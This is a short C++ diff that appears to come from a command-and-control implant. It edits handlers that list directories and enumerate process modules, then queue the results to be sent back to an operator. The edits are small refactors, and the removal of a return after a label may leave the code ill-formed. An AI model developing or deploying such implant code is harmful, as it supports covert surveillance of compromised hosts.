@@ -4,7 +4,7 @@ namespace Commands {
     VOID DirectoryList (PPARSER Parser) {
         HEXANE
 
-        PSTREAM Outbound          = Stream::CreateStreamWithHeaders(TypeTasking);
+        PSTREAM Outbound          = Stream::CreateStreamWithHeaders(TypeResponse);
         ULONG PathSize          = { };
         CHAR Path[MAX_PATH]     = { };
 
@@ -17,7 +17,7 @@ namespace Commands {
 
         Stream::PackDword(Outbound, CommandDir);
 
-        if ((B_PTR(Parser->Handle))[0] == (BYTE)PERIOD) {
+        if ((B_PTR(Parser->Handle))[0] == PERIOD) {
             if (!(PathSize = Ctx->win32.GetCurrentDirectoryA(MAX_PATH * 2, Path))) {
                 return_defer(ERROR_DIRECTORY);
             }
@@ -75,7 +75,7 @@ namespace Commands {
     VOID ProcessModules (PPARSER Parser) {
         HEXANE
 
-        PSTREAM Outbound                  = Stream::CreateStreamWithHeaders(TypeTasking);
+        PSTREAM Outbound                  = Stream::CreateStreamWithHeaders(TypeResponse);
         PPEB_LDR_DATA LdrData           = { };
         PROCESS_BASIC_INFORMATION pbi   = { };
         HANDLE Process                  = { };
@@ -132,9 +132,7 @@ namespace Commands {
         }
 
         Message::OutboundQueue(Outbound);
-
         defer:
-        return;
     }
 
     VOID Shutdown (PPARSER Parser) {
